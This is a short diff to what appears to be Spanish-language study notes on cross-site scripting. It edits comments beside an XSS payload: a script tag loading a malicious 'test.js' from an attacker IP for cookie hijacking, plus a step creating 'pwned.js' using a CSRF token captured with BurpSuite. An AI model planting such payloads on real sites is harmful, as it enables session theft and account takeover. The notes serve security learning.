@@ -145,7 +145,7 @@ External JavaScript Source, podemos cargar código desde un servidor externo par
 * Esto seria un **Cookie Hijacking**
 
 ```javascript
-// 1. Esto lo colocaremos en la web de prueba y crearemos la publicación
+// 1. Esto lo colocaremos en la web en donde se acontece el XSS
 
 <script src="http://192.168.68.111/test.js"></script>    // Colomos la IP de atacante y el nombre del archivo malicioso
 ```
@@ -175,7 +175,7 @@ External JavaScript Source, podemos cargar código desde un servidor externo par
 ```
 
 ```javascript
-// Esto se usa una vez obtenido la 'csrf_token y value'
+// Esto se usa una vez obtenido la 'csrf_token y value', los datos los obtenemos con BurpSuite al momento de crear una publicacion 
 
 ❯ nvim pwned.js                                                 // Creamos el archivo js
 
